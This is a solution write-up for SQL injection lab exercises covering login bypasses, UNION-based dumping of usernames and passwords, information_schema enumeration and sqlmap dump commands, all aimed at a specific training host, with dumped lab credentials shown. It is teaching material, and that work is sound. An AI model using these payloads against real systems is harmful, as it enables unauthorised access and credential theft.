----------------------------------
# SQL Injection

## Authentication Bypass Variant 1
### query:
SELECT * FROM users WHERE username='admin' AND password='pass'

### task:
You know how SQL is used to create login pages. Use that knowledge and try to figure out a way to login without any credentials. 

### payload:
*username*:admin

*password*:pass' OR 1=1 --+

**NOTE:** + is similar to space in URL encoding




## Authentication Bypass Variant 2
### query:
SELECT * FROM users WHERE username='admin' AND password='1a1dc91c907325c69271ddf0c944bc72'

### task:
You already know how to do a basic authentication bypass. Now try to do this one with a slight twist.

### payload:
*username*:admin' OR 1=1 -- 

*password*:123



## GET Based SQL Injection in URL Variant 1
### query:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff

### task:
Your task is to fetch all the usernames and passwords from the database of the website below.

### payload:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-1/details.php?house=hufflepuff' UNION SELECT username,password FROM users --+



## GET Based SQL Injection in URL Variant 2
### query:
http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1

### task:
Your task is to fetch all the usernames and passwords from the database of the website below.

### payload:
*direct method by guessing*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username,NULL,NULL,password FROM users --+



*another appraoch*

*getting database name first*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT database(),version(),NULL,NULL --+ 

database-->SQL_Injection_V4
version-->5.7.29-0ubuntu0.18.04.1

*getting table names from database*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables WHERE table_type = 'base table' --+

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --tables

tables-->
bank_details			
movies 			
users

*getting column names from 'users' table*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name = 'users' --+

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --columns -T users



columns names-->
id 			
username 			
password

*getting username and password from 'users' table*

http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 UNION SELECT username,password,NULL,NULL FROM users --+

python sqlmap.py -u http://13.233.141.160/SQL-Injection/GET-Based-SQL-Injection-in-URL-Variant-2/?category=1 -p category --dump -T users

username 	password 		
qwerty123 	keypad 		
123456789 	login 		
batman 	joker 		
superman 	kryptonite

